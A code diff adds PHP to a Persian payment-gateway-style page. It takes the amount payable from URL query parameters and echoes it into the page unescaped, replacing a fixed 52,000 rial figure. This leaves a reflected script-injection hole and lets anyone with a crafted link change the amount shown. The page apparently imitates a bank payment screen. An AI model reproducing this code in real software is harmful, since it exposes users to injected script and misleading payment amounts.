@@ -1,3 +1,23 @@
+<?php
+
+include "info.php";
+
+if(isset($_GET['amount'])){
+    $_SESSION['amount'] = $_GET['amount'];
+}elseif(isset($_GET['Amount'])){
+    $_SESSION['amount'] = $_GET['Amount'];
+}elseif(isset($_GET['price'])){
+    $_SESSION['amount'] = $_GET['price'];
+}else{
+    $_SESSION['amount'] = "$price";
+}
+$Domain = $_SERVER["HTTP_HOST"];
+
+$cap = json_decode(file_get_contents("api/refid.php?code=$code&quantity=$quantity"))->refid;
+
+?>
+
+
 <!DOCTYPE html>
 <html lang="fa">
 
@@ -329,7 +349,7 @@ showMessage('لطفا اطلاعات مورد نیاز را به درستی وا
 							</div>
 
 							<ul class="merchant-detail price">
-								<li>مبلغ قابل پرداخت :<b class="price-number">52,000 ریال</b></li>
+								<li>مبلغ قابل پرداخت :<b class="price-number"><?php echo $_SESSION["amount"]; ?> ریال</b></li>
 							</ul>
 						</div>
 
@@ -450,3 +470,4 @@ showMessage('لطفا اطلاعات مورد نیاز را به درستی وا
   <style type="text/css">
 </body>
 </html>
+
